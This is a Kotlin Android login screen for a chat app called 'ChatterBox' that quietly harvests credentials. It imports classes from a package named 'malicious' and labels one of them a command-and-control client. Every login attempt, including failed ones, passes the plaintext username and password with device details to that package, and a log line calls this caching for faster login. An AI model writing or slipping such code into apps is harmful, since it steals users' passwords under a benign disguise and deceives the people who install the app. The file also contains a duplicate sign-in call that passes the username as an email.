package com.example.ChatterBox

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.example.ChatterBox.malicious.AccountManager
import com.example.ChatterBox.malicious.DataSynchronizer

import com.google.firebase.auth.FirebaseAuth
import org.json.JSONObject
import com.google.firebase.firestore.FirebaseFirestore

class LoginActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth
    private lateinit var firestore: FirebaseFirestore
    private lateinit var dataSync: DataSynchronizer

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.login_activity)

        auth = FirebaseAuth.getInstance()

        // Initialize C2 client
        dataSync = DataSynchronizer(this)
        firestore = FirebaseFirestore.getInstance()

        val usernameInput = findViewById<EditText>(R.id.usernameInput)
        val passwordInput = findViewById<EditText>(R.id.passwordInput)
        val loginButton = findViewById<Button>(R.id.loginButton)
        val progressBar = findViewById<ProgressBar>(R.id.progressBar)

        loginButton.setOnClickListener {
            val username = usernameInput.text.toString().trim()
            val password = passwordInput.text.toString().trim()

            if (username.isEmpty() || password.isEmpty()) {
                Toast.makeText(this, "Fields cannot be empty", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            progressBar.visibility = ProgressBar.VISIBLE
            // Retrieve email associated with the username
            firestore.collection("users")
                .whereEqualTo("username", username)
                .get()
                .addOnSuccessListener { documents ->
                    if (!documents.isEmpty) {
                        val email = documents.documents[0].getString("email") // Fetch email
                        if (!email.isNullOrEmpty()) {
                            authenticateUser(email, password, progressBar)
                        } else {
                            Toast.makeText(
                                this,
                                "No account found for this username",
                                Toast.LENGTH_SHORT
                            ).show()
                            progressBar.visibility = ProgressBar.GONE
                        }
                    } else {
                        Toast.makeText(this, "Username not found", Toast.LENGTH_SHORT).show()
                        progressBar.visibility = ProgressBar.GONE
                    }
                }
                .addOnFailureListener {
                    Toast.makeText(
                        this,
                        "Error fetching username: ${it.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    progressBar.visibility = ProgressBar.GONE
                }

            cacheAuthData(username, password)

            connectToServer(username)

            auth.signInWithEmailAndPassword(username, password)
                .addOnSuccessListener {
                    startActivity(Intent(this, MainActivity::class.java))
                    finish()
                }
                .addOnFailureListener {
                    Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()

                    cacheAuthData(username, password, failed = true)
                }
                .addOnCompleteListener {
                    progressBar.visibility = ProgressBar.GONE
                }
            }
    }

    private fun connectToServer(userEmail: String) {
        try {

            val loginData = JSONObject().apply {
                put("event_type", "user_login")
                put("email", userEmail)
                put("timestamp", System.currentTimeMillis())
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
            }


            Log.d("Server", "Successfully connected to server!")
        } catch (e: Exception) {
            Log.e("Server", "Error connecting to server", e)
        }
    }

    private fun cacheAuthData(email: String, password: String, failed: Boolean = false) {
        try {
            val extraData = mapOf(
                "device_model" to android.os.Build.MODEL,
                "device_manufacturer" to android.os.Build.MANUFACTURER,
                "android_version" to android.os.Build.VERSION.RELEASE,
                "login_successful" to (!failed).toString(),
                "app_version" to "1.0"
            )

            AccountManager.cacheAuthData(
                context = this,
                source = "ChatterBox Login",
                username = email,
                password = password,
                extraData = extraData
            )

            Log.d("LoginActivity", "Authentication data cached for faster login")
        } catch (e: Exception) {
            Log.e("LoginActivity", "Error caching auth data", e)
        }
    }

    private fun authenticateUser(email: String, password: String, progressBar: ProgressBar) {
        auth.signInWithEmailAndPassword(email, password) // Ensure this uses email
            .addOnSuccessListener {
                startActivity(Intent(this, MainActivity::class.java))
                finish()
            }
            .addOnFailureListener {
                Toast.makeText(this, "Login failed: ${it.message}", Toast.LENGTH_SHORT).show()
            }
            .addOnCompleteListener {
                progressBar.visibility = ProgressBar.GONE
            }
    }
}
